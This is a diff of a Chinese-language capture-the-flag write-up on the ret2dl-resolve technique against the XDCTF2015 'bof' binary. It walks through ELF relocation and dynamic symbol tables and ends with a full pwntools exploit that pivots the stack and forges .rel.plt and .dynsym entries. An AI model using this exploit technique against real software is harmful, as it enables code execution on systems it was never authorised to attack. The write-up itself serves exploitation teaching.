@@ -197,7 +197,7 @@ typedef struct {
 #define ELF32_R_TYPE(info) ((unsigned char)(info))
 #define ELF32_R_INFO(sym, type) (((sym)<<8)+(unsigned char)(type))
 ```
-使用`readelf -r bof` 可以看到这两个段的数据结构，省略了'.rel.dyn'的输出
+使用`readelf -r bof` 可以看到这两个段的数据结构，省略了`.rel.dyn`的输出
 ```
 Relocation section '.rel.plt' at offset 0x330 contains 5 entries:
  Offset     Info    Type            Sym.Value  Sym. Name
@@ -207,5 +207,119 @@ Relocation section '.rel.plt' at offset 0x330 contains 5 entries:
 0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
 0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
 ```
-其中，offset就是`.got.plt`中保存的对应函数地址的地址，即*(0804a01c)=&write
-看
+其中，offset就是`.got.plt`中保存的对应函数地址的地址，即*(0804a01c)=&write  
+看上面和`.rel.dyn`相关的两个宏，可以求解出:
+```
+ELF32_R_SYM=6
+ELF32_R_TYPE=7
+```
+也就是说Elf32_Sym[6]保存着write的符号表信息，Type为`R_386_JUMP_SLOT`。Elf32_Sym实际上就是
+`.dynsym` section，这个section的数据结构如下:
+```
+typedef struct
+{
+    Elf32_Word st_name;     // Symbol name(string table index)
+    Elf32_Addr st_value;    // Symbol value
+    Elf32_Word st_size;     // Symbol size
+    unsigned char st_info;  // Symbol type and binding
+    unsigned char st_other; // Symbol visibility under glibc>=2.2
+    Elf32_Section st_shndx; // Section index
+} Elf32_Sym;
+```
+使用`readelf -s bof`可以看到
+```
+Symbol table '.dynsym' contains 10 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)
+     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
+     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.0 (2)
+     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
+     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)
+     7: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.0 (2)
+     8: 0804863c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
+     9: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.0 (2
+```
+第六个就是我们的write。  
+好了，总结下思路，首先，通过ROP控制RIP执行_dl_runtime_resolve(link_map, reloc_arg),其中reloc_arg是我们可控的，控制reloc_arg 使得glibc 索引到我们伪造的`.rel.dyn`项上，我们可以在bss、data等段进行伪造，其次控制伪造的`r_info`值，从而控制`.dynsym`项，`r_offset`就是我们要改写的write的地址，所以使用原本的就OK，
+我们看下`dynsym`的第六项（有更好的办法一定要告诉我啊）：
+```
+pwndbg> x /16xb 0x8048238
+0x8048238:      0x4c    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x8048240:      0x00    0x00    0x00    0x00    0x12    0x00    0x00    0x00
+```
+可以发现`Elf32_Word st_name=0x4c`，也就是说 `.dynstr+04c`就是字符串write的地址.
+
+```
+pwndbg> x /s 0x08048278+0x4c
+0x80482c4:      "write"
+```
+然后我们就可以伪造`.st_name`，把write改成system...  
+好长的ROP啊
+
+## exp
+“你猜怎么伪造`.st_name`”
+```py
+#!/usr/bin/python
+
+from pwn import *
+elf = ELF('bof')
+offset = 112
+read_plt = elf.plt['read']
+write_plt = elf.plt['write']
+
+ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
+pop_ebp_ret = 0x0804861b
+leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"
+
+stack_size = 0x800
+bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
+base_stage = bss_addr + stack_size
+
+r = process('./bof')
+
+r.recvuntil('Welcome to XDCTF2015~!\n')
+payload = 'A' * offset
+payload += p32(read_plt) # 读100个字节到base_stage
+payload += p32(ppp_ret)
+payload += p32(0)
+payload += p32(base_stage)
+payload += p32(100)
+payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中
+payload += p32(base_stage)
+payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage
+r.sendline(payload)
+
+cmd = "/bin/sh"
+plt_0 = 0x08048380
+rel_plt = 0x08048330
+index_offset = (base_stage + 28) - rel_plt
+write_got = elf.got['write']
+dynsym = 0x080481d8
+dynstr = 0x08048278
+fake_sym_addr = base_stage + 36
+align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小
+fake_sym_addr = fake_sym_addr + align
+index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号
+r_info = (index_dynsym << 8) | 0x7
+fake_reloc = p32(write_got) + p32(r_info)
+st_name = 0x4c
+fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
+
+payload2 = 'AAAA'
+payload2 += p32(plt_0)
+payload2 += p32(index_offset)
+payload2 += 'AAAA'
+payload2 += p32(1)
+payload2 += p32(base_stage + 80)
+payload2 += p32(len(cmd))
+payload2 += fake_reloc # (base_stage+28)的位置
+payload2 += 'B' * align
+payload2 += fake_sym # (base_stage+36)的位置
+payload2 += 'A' * (80 - len(payload2))
+payload2 += cmd + '\x00'
+payload2 += 'A' * (100 - len(payload2))
+r.sendline(payload2)
+r.interactive()
+```
